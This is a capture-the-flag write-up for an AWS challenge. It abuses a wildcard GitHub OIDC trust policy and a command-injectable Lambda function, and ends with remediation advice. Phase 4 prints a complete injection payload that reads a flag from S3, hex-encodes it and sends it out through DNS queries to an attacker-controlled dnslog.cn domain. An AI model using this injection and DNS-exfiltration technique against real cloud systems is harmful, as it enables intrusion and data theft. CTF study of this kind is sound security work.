# Stage 1 Writeup: Have Some Faith

## Challenge Overview
- **Challenge:** "Have Some Faith" - Stage 1
- **Target Account:** 009661764077
- **Entry Point:** `.git` archive (`dotgit.zip`) at `https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/dotgit.zip`

## Phase 1: Initial Recon
The challenge provided a link to a `.git` archive. We downloaded and extracted `dotgit.zip` and analyzed the git history.
Through the commit history, we found a commit containing the source code for an AWS Lambda function (`nslookupv2`).

## Phase 2: Vulnerability Discovery
Analyzing the infrastructure and code revealed several critical vulnerabilities:
- **OIDC Trust Policy Misconfiguration:** A wildcard (`repo:*/*`) was used in the trust policy for the `corgi` branch, allowing any repository to assume the `cicdRole`.
- **Lambda Command Injection:** The `nslookupv2` Lambda function had a command injection vulnerability. The `domain` parameter was directly injected into the `/opt/nslookup` command without sanitization.
- **IAM Role Permissions:** The `cicdRole` and `lambdaRole` had excessive permissions that could be leveraged for privilege escalation or lateral movement.

## Phase 3: Exploitation
We created a GitHub Actions workflow on our repository's `corgi` branch to assume the misconfigured `cicdRole`.
Using this role, we mapped out the environment and discovered several S3 buckets:
- `codec4f26c862a321ef5`
- `platform-bucket-009661764077-us-east-1`
- `site781fe43f26b9eba3`

We found a bucket policy that required VPC-only access. To interact with the internal resources, we used command injection via `awscurl` to invoke the vulnerable Lambda function.

## Phase 4: Flag Exfiltration via DNS
The vulnerable Lambda function was deployed in a VPC with no internet access, no NAT gateway, and no write permissions to S3.
However, we discovered that the Route 53 VPC Resolver at `169.254.169.253` forwarded external DNS queries.
We exploited this by using the command injection to hex-encode the flag and append it as a subdomain to our controlled DNS server (`dnslog.cn`).

Payload used:
```bash
; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c 'import binascii; print(binascii.hexlify(open("/tmp/flag.txt","rb").read()).decode())'); /opt/nslookup $FLAG.ixz9wv.dnslog.cn
```

We received the following DNS request:
`3161316a656c726c6667327969327330`

Decoding the hex value revealed the Stage 1 flag:
**`1a1jelrlfg2yi2s0`**

## Remediation
| Vulnerability | Remediation |
| ------------- | ----------- |
| OIDC Wildcard | Restrict the `sub` condition in the OIDC Trust Policy to the specific repository and branch (`repo:org/repo:ref:refs/heads/corgi`). |
| Command Injection | Use safe parameter passing mechanisms instead of string concatenation for system commands. |
| Excessive Privileges | Apply the principle of least privilege to IAM roles. |
